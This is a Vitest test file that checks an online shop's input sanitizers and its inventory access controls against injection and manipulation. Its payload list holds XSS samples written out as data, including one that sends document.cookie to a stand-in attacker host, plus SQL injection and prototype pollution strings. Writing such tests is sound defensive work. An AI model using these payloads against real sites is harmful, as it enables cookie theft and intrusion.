import { describe, it, expect } from 'vitest';
import {
  hasMaliciousContent,
  stripDangerousMarkup,
  sanitizeName,
  isValidName,
  sanitizePhone,
  isValidPhone,
  sanitizeAddress,
  isValidEmail,
} from '../utils/validation';
import { inventorySystem } from '../utils/inventorySystem';

describe('Penetration & Security Test Suite — Injection Hardening', () => {
  const XSS_PAYLOADS = [
    '<script>alert("PWNED")</script>',
    '<SCRIPT SRC="https://evil.attacker.com/malware.js"></SCRIPT>',
    '<img src="invalid_img" onerror="fetch(\'https://attacker.com/steal?cookie=\' + document.cookie)" />',
    '<svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    'javascript:void(window.location=\'https://phishing.site\')',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    '<body onload="alert(\'exploit\')">',
    '"><script>alert(1)</script>',
    '<input type="text" autofocus onfocus="alert(1)">',
  ];

  it('1. DETECTS all standard XSS and script injection attack vectors', () => {
    XSS_PAYLOADS.forEach((payload) => {
      const isDetected = hasMaliciousContent(payload);
      expect(isDetected).toBe(true);
    });
  });

  it('2. NEUTRALIZES and strips malicious tags from input strings', () => {
    XSS_PAYLOADS.forEach((payload) => {
      const stripped = stripDangerousMarkup(payload);
      expect(stripped).not.toContain('<script');
      expect(stripped).not.toContain('<iframe');
      expect(stripped).not.toContain('onerror=');
      expect(stripped).not.toContain('javascript:');
      expect(hasMaliciousContent(stripped)).toBe(false);
    });
  });

  it('3. HARDENS Customer Name field against symbol & code injection', () => {
    const maliciousName = '<script>alert(1)</script> Arjun 12345 !@#$%^&*()';
    const sanitized = sanitizeName(maliciousName);

    // Strips script, digits, and symbols — leaving pure clean alphabetic name
    expect(sanitized).toBe('Arjun');
    expect(isValidName(sanitized)).toBe(true);

    // Direct malicious payloads are strictly invalidated
    expect(isValidName('<script>alert(1)</script>')).toBe(false);
    expect(isValidName('Arjun123')).toBe(false);
    expect(isValidName('Vikram@#$')).toBe(false);
  });

  it('4. HARDENS Phone Number input against alpha & script attacks', () => {
    const maliciousPhone = '+91 98765-43210 <iframe src="evil.com"></iframe>';
    const sanitized = sanitizePhone(maliciousPhone);

    expect(sanitized).toBe('+91 98765-43210 ');
    expect(isValidPhone(sanitized)).toBe(true);
    expect(isValidPhone('invalid')).toBe(false);
    expect(isValidPhone('123')).toBe(false); // too short (<7 digits)
  });

  it('5. GUARDS Address and Shipping inputs against HTML markup', () => {
    const maliciousAddress = 'Apartment 4B, 10th Cross <script>steal()</script>, MG Road';
    const sanitized = sanitizeAddress(maliciousAddress);

    expect(sanitized).not.toContain('<script');
    expect(sanitized).toContain('Apartment 4B, 10th Cross');
    expect(sanitized).toContain('MG Road');
  });

  it('6. GUARDS Email field against SQL injection & header smuggling', () => {
    const sqlInjectionEmail = 'user@example.com\' OR \'1\'=\'1\' --';
    expect(isValidEmail(sqlInjectionEmail)).toBe(false);

    const scriptEmail = '<script>alert(1)</script>@domain.com';
    expect(isValidEmail(scriptEmail)).toBe(false);

    const validEmail = 'vikram.rao@western-ghats.org';
    expect(isValidEmail(validEmail)).toBe(true);
  });

  it('7. WITHSTANDS Buffer Overflow & Large String Fuzzing (100,000 characters)', () => {
    const hugeInput = 'A'.repeat(100000);
    const start = performance.now();
    const result = hasMaliciousContent(hugeInput);
    const duration = performance.now() - start;

    expect(result).toBe(false);
    // Must complete in under 50ms without catastrophic regex backtracking
    expect(duration).toBeLessThan(50);
  });

  it('8. BLOCKS Prototype Pollution and object poisoning attempts', () => {
    expect(hasMaliciousContent('__proto__.polluted = true')).toBe(true);
    expect(hasMaliciousContent('constructor.prototype.admin = true')).toBe(true);

    // In inventory system, accessing __proto__ or toString as lot ID safely returns 0
    const protoStock = inventorySystem.getStock('__proto__');
    expect(protoStock).toBe(0);

    const toStringStock = inventorySystem.getStock('toString');
    expect(toStringStock).toBe(0);
  });

  it('9. DEFENDS against Type Confusion attacks (non-string & null inputs)', () => {
    // Attackers passing unexpected types should never cause unhandled TypeError
    expect(hasMaliciousContent(null as any)).toBe(false);
    expect(hasMaliciousContent(undefined as any)).toBe(false);
    expect(hasMaliciousContent(12345 as any)).toBe(false);
    expect(hasMaliciousContent({ malicious: true } as any)).toBe(false);

    expect(stripDangerousMarkup(null as any)).toBe('');
    expect(stripDangerousMarkup(undefined as any)).toBe('');
    expect(stripDangerousMarkup(12345 as any)).toBe('');

    expect(isValidPhone(null as any)).toBe(false);
    expect(isValidPhone(undefined as any)).toBe(false);
  });

  it('10. BLOCKS Malicious Order Manipulation (negative qty, empty cart, prototype lot IDs)', () => {
    // Empty order commitment is rejected
    const emptyOrder = inventorySystem.commitOrder([]);
    expect(emptyOrder.success).toBe(false);

    // Order with negative or zero quantities is rejected
    const negativeOrder = inventorySystem.commitOrder([
      { productId: 'prod-01', quantity: -5 },
      { productId: 'prod-02', quantity: 0 },
    ]);
    expect(negativeOrder.success).toBe(false);

    // Order targeting prototype keys is rejected
    const protoOrder = inventorySystem.commitOrder([
      { productId: '__proto__', quantity: 1 },
    ]);
    expect(protoOrder.success).toBe(false);
    expect(protoOrder.error).toContain('Invalid or unrecognized lot ID');
  });

  it('11. GUARDS IMS Inventory against unauthorized privilege escalation', () => {
    // Attempting to restock or overwrite stock without an active IMS engineer/admin session throws
    expect(() => {
      inventorySystem.restock('prod-01', 50, null);
    }).toThrow('Access Denied');

    expect(() => {
      inventorySystem.setStockDirect('prod-01', 999, null);
    }).toThrow('Access Denied');

    // Customer role attempting to restock
    const fakeCustomerSession = {
      email: 'hacker@malicious.com',
      name: 'Hacker Attacker',
      role: 'CUSTOMER' as any,
      token: 'fake-jwt',
      authenticatedAt: new Date().toISOString(),
    };
    expect(() => {
      inventorySystem.restock('prod-01', 50, fakeCustomerSession as any);
    }).toThrow('Access Denied');
  });
});

